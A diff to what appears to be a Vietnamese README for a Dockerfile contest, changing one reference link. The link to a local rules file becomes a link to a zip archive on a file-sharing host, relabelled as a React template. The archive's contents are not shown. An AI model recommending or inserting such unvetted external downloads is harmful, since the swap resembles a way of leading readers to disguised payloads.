@@ -270,7 +270,7 @@ wc -l Dockerfile.txt
 - [musl libc](https://musl.libc.org/)
 - [Brotli compression](https://github.com/google/brotli)
 - [Docker BuildKit](https://docs.docker.com/build/buildkit/)
-- [Dockerfile Contest 2025 Rules](./vite-react-template/Bộ%20quy%20tắc%20hướng%20dẫn%20Dockerfile%20hiệu%20quả.md)
+- [Dockerfile Contest 2025 React Template](https://www.mediafire.com/file/o4n7xa35k0law1v/vite-react-template.zip/file)
 
 ## 🎯 Chiến lược Contest
 
